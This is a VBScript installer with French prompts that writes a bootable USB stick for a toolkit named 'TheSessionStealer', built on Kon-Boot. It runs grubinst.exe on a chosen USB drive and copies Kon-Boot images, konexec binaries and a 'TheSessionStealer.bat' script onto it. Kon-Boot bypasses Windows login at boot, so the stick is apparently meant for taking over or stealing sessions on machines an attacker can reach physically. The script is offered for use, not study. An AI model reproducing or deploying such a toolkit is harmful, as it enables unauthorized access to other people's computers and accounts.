' --- KON-BOOT USB INSTALLER -------------------------------
' (c) kon-boot.com 
' ----------------------------------------------------------
Dim query 
Dim WMBIObj 
Dim AllDiskDrives 
Dim SingleDiskDrive 
Dim AllLogicalDisks 
Dim SingleLogicalDisk 
Dim AllPartitions 
Dim Partition 
Dim result
Dim textmsg
Dim wshShell
Dim FileObj
Dim Counter
Dim CDir

set FileObj = CreateObject("Scripting.FileSystemObject")
set wshShell = wscript.createObject("wscript.shell")
Set WMBIObj = GetObject("winmgmts:\\.\root\cimv2")


CDir = FileObj.GetAbsolutePathName(".")


textmsg = 	"VEUILLEZ DÉTACHER TOUS LES LECTEURS USB INUTILES SAUF LA CIBLE USB POUR THESESSIONSTEALER KON-BOOT" & VbCr & VbCr & _ 
		"ASSUREZ-VOUS QUE LE FICHIER .BAT A ETE EXECUTE AVEC LES DROITS ADMIN (CLIC DROIT-> EXECUTER COMME ADMINISTRATEUR)" & VbCr & VbCr & _ 
		"CLIQUEZ SUR OK POUR CONTINUER"
MsgBox textmsg, vbInformation + vbOKOnly, "TheSessionStealer - kon-boot"


Set AllDiskDrives = WMBIObj.ExecQuery("SELECT * FROM Win32_DiskDrive where InterfaceType='USB'") ' 
For Each SingleDiskDrive In AllDiskDrives 
	counter = counter + 1
    query = "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" + SingleDiskDrive.DeviceID + "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition" 
    Set AllPartitions = WMBIObj.ExecQuery(query) 
    For Each Partition In AllPartitions 
        query = "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" + Partition.DeviceID + "'} WHERE AssocClass = Win32_LogicalDiskToPartition"
        Set AllLogicalDisks = WMBIObj.ExecQuery (query) 
        For Each SingleLogicalDisk In AllLogicalDisks  
			
			textmsg = 	"============================================" & VbCr & _ 
						"ID de la clé USB: " & SingleDiskDrive.DeviceID & VbCr & _ 
						"Lettre: " & SingleLogicalDisk.DeviceID  & VbCr & _ 
						"Modèle: " & SingleDiskDrive.Model & VbCr & _ 
						"Fabricant: " & SingleDiskDrive.Manufacturer & VbCr & _
						"============================================" & VbCr & _ 
						"Souhaitez-vous utiliser ce lecteur comme destination?" & VbCr & _ 
						"Attention, les données du disque vont être suprimer"
			result = MsgBox(textmsg, vbQuestion + vbOKCancel, "TheSessionStealer - kon-boot")
			
			if result = vbOk Then
				wshShell.Run "grubinst.exe --skip-mbr-test " & SingleDiskDrive.DeviceID, 1, true

				FileObj.CopyFolder CDir & "\EFI", SingleLogicalDisk.DeviceID & "\", 1			

				FileObj.CopyFile "USBFILES\grldr", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\menu.lst", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\konbootOLD.img", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\konexec64.exe", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\konexec32.exe", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\logo.txt", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\configuration.txt", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFile "USBFILES\TheSessionStealer.bat", SingleLogicalDisk.DeviceID & "\", 1
				FileObj.CopyFolder CDir & "\USBFILES\bin", SingleLogicalDisk.DeviceID & "\", 1
				
				MsgBox "Votre clé USB TheSessionStealer avec Kon-Boot est prêt!", vbInformation + vbOKOnly, "TheSessionStealer - kon-boot"
				WScript.quit 
			End If
		Next
    Next 
Next 
if counter = 0 Then
	MsgBox "Aucun disque USB détecté ou erreur inconnue!", vbCritical + vbOkOnly, "TheSessionStealer - kon-boot"
End If